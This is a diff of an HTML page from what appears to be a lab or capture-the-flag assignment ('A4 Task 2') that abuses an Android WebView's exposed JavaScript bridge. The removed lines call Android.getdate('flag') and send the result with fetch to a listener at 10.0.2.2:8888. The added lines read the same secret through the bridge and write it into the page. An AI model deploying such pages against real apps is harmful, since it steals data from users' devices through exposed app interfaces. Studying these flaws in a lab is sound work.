@@ -2,17 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Exploit Page</title>
+  <title>A4 Task 2</title>
 </head>
 <body>
+  <div id="flagOutput">TEST TEXT</div>
   <script>
-    try {
-      const flag = Android.getdate("flag").split("||")[0];
-      fetch("http://10.0.2.2:8888/flag?f=" + encodeURIComponent(flag));
-    } catch (e) {
-      console.log("Exploit failed", e);
-    }
+    (function () {
+      setTimeout(function () {
+        try {
+          var flagInfo = Android.getdate("flag");
+          var flagDiv = document.getElementById("flagOutput");
+          if (flagDiv) {
+            flagDiv.innerText = flagInfo;
+          } else {
+            document.write(flagInfo);
+          }
+          console.log("script executed with setTimeout: flag set to", flagInfo);
+        } catch (e) {
+          console.error("error executing Android.getdate:", e);
+        }
+      }, 0);
+    })();
   </script>
-  <p>Page loaded</p>
 </body>
 </html>
